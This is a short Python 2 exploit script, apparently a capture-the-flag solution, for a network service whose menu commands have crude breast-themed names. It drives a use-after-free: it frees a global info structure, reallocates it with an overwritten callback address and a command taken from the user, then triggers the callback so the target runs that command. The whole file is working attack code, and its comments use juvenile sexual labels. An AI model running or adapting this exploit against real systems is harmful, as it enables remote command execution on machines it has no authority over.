import socket, sys, struct

if len(sys.argv) != 3:
    print 'Usage: %s <ip> <command>' % sys.argv[0]
    exit(0)

s = socket.create_connection((sys.argv[1], 0xb00b))

# cold breasts -> set global info variable
s.send('( ^ )( ^ )\n')
print s.recv(2048)

# lopsided breasts -> free global info variable
s.send('(o)(O)\n')
print s.recv(2048)

# wonder bra breasts -> allocate and write string (overwriting global info)
s.send('(oYo)\n')
print s.recv(2048)
x = struct.pack('I', 0x804857c) + sys.argv[2]
s.send('%s\x00%s\n' % (x, 'A' * (131 + len(x))))

# pornstar breasts -> execute callback
s.send('($)($)\n')
print s.recv(2048)
